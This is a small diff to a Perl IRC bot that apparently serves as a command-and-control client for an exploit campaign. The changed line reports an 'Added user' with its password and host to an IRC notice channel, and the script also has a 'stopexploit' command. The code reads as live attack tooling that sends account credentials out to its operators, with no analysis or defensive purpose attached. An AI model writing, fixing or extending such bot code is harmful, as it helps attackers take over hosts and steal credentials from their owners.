@@ -71,7 +71,7 @@ $irc->on(irc_privmsg => sub {
   $h0st = $ENV{'H0ST'};
   $us3r = $ENV{'US3R'};
   $p4ss = $ENV{'P4SSWD'};
-  $irc->write(notice => $noticechan => '9,1Added user:' "$us3r" 'password:' "$p4ss" 'on host:' "$h0st"');
+  $irc->write(notice => $noticechan => "9,1Added user:" . $misc->{us3r} . "password:" . $misc->{p4ss} . "on host:" . $misc->{h0st});
  }
  elsif ($msg =~ /@.stopexploit/) {
   warn 'stopexploit called, killing...';
